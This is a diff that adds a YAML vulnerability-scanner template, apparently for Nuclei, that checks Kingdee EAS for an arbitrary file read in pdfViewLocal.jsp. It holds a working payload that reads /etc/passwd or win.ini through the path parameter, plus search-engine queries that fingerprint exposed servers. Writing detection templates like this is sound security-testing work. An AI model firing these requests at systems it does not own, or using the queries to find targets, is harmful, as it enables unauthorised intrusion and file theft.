@@ -1,0 +1,31 @@
+id: kingdee-eas-content-pdfviewlocal-fileread
+info:
+  name: 金蝶 EAS pdfviewloca.jsp - fileread
+  author: cnaq
+  severity: high
+  description: 金蝶EAS_pdfviewlocal任意文件读取漏洞
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: body="easSessionId" || header="easportal" || header="eassso/login" || banner="eassso/login" || body="/eassso/common" || (title="EAS系统登录" && body="金蝶")
+    hunter-query: web.body="/eassso/images/"
+    quake-query: app:"金蝶-EAS"
+    zoomeye-query: app:"金蝶 EAS"
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E9%87%91%E8%9D%B6EAS_pdfviewlocal%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
+  tags: kingdee,fileread,eas
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/plt_document/fragments/content/pdfViewLocal.jsp?path=/etc/passwd"
+      - "{{BaseURL}}/plt_document/fragments/content/pdfViewLocal.jsp?path=c:/windows/win.ini"
+
+    stop-at-first-match: true
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+          - "\\[(font|extension|file)s\\]"
+        condition: or
